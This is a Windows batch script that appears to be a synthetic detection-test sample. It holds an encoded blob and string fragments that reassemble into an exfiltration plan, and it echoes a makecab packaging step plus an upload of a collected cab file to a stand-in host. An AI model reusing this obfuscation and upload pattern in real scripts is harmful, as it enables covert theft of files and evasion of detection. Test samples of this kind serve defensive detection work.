@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:plain_fragments|reverse_xor
rem HUNTRESS-MATERIAL:V1JcX0NGHFdaX1JFXVodVl9DXlJLVh1WBVcEBAcDBwcLHBwJQENHR1sOX0FGbFdSXF9DRk9RUlAdVgVXBAQHAwcHCx5HUFZfX1xQb1FSf0BAVkFHXUZ7b1BaX1FGY29AQVZAZm8JcA5bR1JDbFZQQUZcQE9WBVcEBAcDBwcLHl1UWlJDXlJQDldabF1UWlJDXlJQT1ZdXF0OVlRSRlRdUl9sR0tWXU9WVFJGVF1SX2xAQFxBUA5bQ1JBVE8CDkddRlxQbFZUUkdAT1ZLVh1RUlBWWFJeDkFWR0NSV1JPVkdcXlZBbFdSXF9DRh9BVlVAXVJBR2xWQVJDVkFDH19SUFxfbFZHUlBcXw5AQ1ZHQE8CDkU=
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
SeT "h0=v=1|steps=locate_local,prepare_transfer,upload_remote|adapter=makecab"
SeT "h1=.exe|stage_count=1|graph=cross_language|next_language=none|campaign_i"
SeT "h2=d=campaign-8440477d6e|source_path=C:\Users\Public\HuntressLab\collect"
SeT "h3=-8440477d6e.cab|upload_url=https://8440477d6e.example.invalid/upload"
goto :HUNTRESS_SEPARATOR_DONE
echo HUNTRESS_SEPARATOR | findstr HUNTRESS >nul
:HUNTRESS_SEPARATOR_DONE
set "neutral_environment_probe=e35406b0"
for /l %%Q in (1,1,1) do call :HUNTRESS_RECOVER
goto :HUNTRESS_EMIT
:HUNTRESS_RECOVER
call set "cfg=%%h0%%%%h1%%%%h2%%%%h3%%"
exit /b 0
:HUNTRESS_EMIT
echo(!cfg!
exit /b 0
:HUNTRESS_UNUSED
goto :HUNTRESS_PLAN
:HUNTRESS_PLAN
echo makecab.exe upload C:\Users\Public\HuntressLab\collect-8440477d6e.cab to https://8440477d6e.example.invalid/upload
exit /b 0
